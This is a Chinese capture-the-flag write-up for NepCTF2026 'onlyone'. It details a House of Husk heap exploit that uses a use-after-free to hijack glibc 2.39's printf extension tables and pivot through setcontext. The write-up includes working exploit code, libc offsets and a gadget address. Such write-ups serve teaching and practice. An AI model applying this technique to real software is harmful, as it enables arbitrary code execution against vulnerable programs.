# NepCTF2026 onlyone Writeup

## 题目简述

题目使用父子进程和两组匿名管道隔离 flag。父进程以 UID/GID 1001 运行，预先读取 `/priv/flag.txt`；子进程降权到 UID/GID 1000，只运行有漏洞的堆菜单。子进程无法直接读取 flag，真正的成功条件是向父进程保存的管道写端发送六字节口令 `Nepnep`。

预期解法是 House of Husk：利用 UAF 修改释放块的 `fd`，把一次分配导向 glibc 的 `printf` 扩展表，再借 `%!` 触发伪造的 `__printf_arginfo_table`、`__printf_va_arg_table` 和 `__printf_function_table`，最终通过 `setcontext` 调用 `write(6, "Nepnep", 6)`。

## 解题过程

### 1. 明确进程与管道关系

程序创建 `pipedes` 和 `fd` 两组管道后 `fork()`：

```text
pipedes[1]  父进程写，pipedes[0] 子进程读，用于启动同步
fd[1]       子进程写，fd[0] 父进程读，用于提交口令
```

子进程关闭无用端点，将 `fd[1]` 保存到 `pie_base + 0x5010`，再进入菜单。父进程读取 flag 后发送启动字节，并等待从 `fd[0]` 收到六字节数据。

本地在 `close(fd[0])` 前查看子进程栈，可以确认第二组管道通常为：

```text
fd[0] = 5
fd[1] = 6
```

因此最终动作不是 ORW，而是：

```c
write(6, "Nepnep", 6);
```

### 2. 获取地址与任意地址分配

程序启动时直接打印 `printf` 地址，可计算 libc 基址。`show` 又会输出槽位中的堆指针，正常分配后即可取得首块用户区地址：

```python
printf_leak = int(io.recvline().strip(), 16)
libc.address = printf_leak - libc.sym["printf"]

for i in range(4):
    add(i)
chunk0 = int(show(0), 16)
```

`poke` 可在堆块释放后修改其 `fd`。污染空闲链表后，后续分配便可落到任意目标。题目虽然禁止分配区域与 `stdin`、`stdout`、`stderr` 三个标准 `FILE` 对象重叠，但没有禁止修改其他 glibc 全局结构。

glibc 2.39 中三个目标指针位于：

```text
libc + 0x205660  __printf_function_table
libc + 0x205668  __printf_arginfo_table
libc + 0x205678  __printf_va_arg_table
```

将释放块的 `fd` 改为 `libc + 0x205660`，再分配两次，即可覆盖三个表指针。

### 3. 布置伪表与 `setcontext`

触发串为 `%!`，说明符 `!` 的索引是 `0x21`。以 `chunk0` 为基准布置：

```python
ctx_base      = chunk0 + 0x18
arginfo_table = chunk0 - 0x100
function_table = chunk0 - 0xC0
```

于是：

```text
arginfo_table + 0x21 * 8 = chunk0 + 0x08
function_table + 0x21 * 8 = chunk0 + 0x48
```

`chunk0+0x08` 放置 `libc+0x12D6D1`：

```asm
add eax, 1
mov dword ptr [rdx], eax
ret
```

该 gadget 在格式串解析中执行两次，把参数类型推进到 `0x22`。随后 `printf_positional` 会通过受控的 `__printf_va_arg_table` 间接调用 `setcontext+0x126`，从堆上的伪上下文恢复：

```text
rdi = 6
rsi = chunk0 + 0xC8   ; "Nepnep"
rdx = 6
rip = write
```

`__printf_function_table[0x21]` 则指向 `_exit`，使子进程完成写管道后退出，父进程继续校验并打印 flag。

关键堆布局代码如下：

```python
printf_tables = libc.address + 0x205660
setcontext_126 = libc.sym["setcontext"] + 0x126
arginfo_gadget = libc.address + 0x12D6D1

write_note(0, flat(0, arginfo_gadget, 0, 0, 0, 0))
write_note(1, flat(0, libc.sym["_exit"], 0, 0, 0, 0))
write_note(2, flat(6, chunk0 + 0xC8, 0, 0, 6, 0))
write_note(3, flat(libc.sym["write"], b"Nepnep\x00\x00", 0, 0, 0, setcontext_126))

free(0)
poke(0, printf_tables)
add(4)
add(5)
write_note(5, flat(function_table, arginfo_table, 0, ctx_base, 0, 0))
trigger(1, b"%!")
```

第一次 arginfo gadget 返回后，解析器会检查 `eax` 是否为负。入口处 `eax` 不能完全控制，官方环境成功率约为二分之一；失败时重新连接即可。

## 方法总结

House of Husk 的核心不是直接覆盖标准流，而是劫持 glibc 可扩展 `printf` 的全局回调表。遇到标准 `FILE` 对象保护时，应继续检查同一子系统里的其他全局间接调用点。

本题还要求先理解进程边界：flag 在父进程地址空间，子进程拿 shell 或做 ORW 都不是正确目标。把父子进程、UID、管道端点和最终校验条件画清楚后，复杂堆利用可以收敛为一次精确的 `write(6, "Nepnep", 6)`。
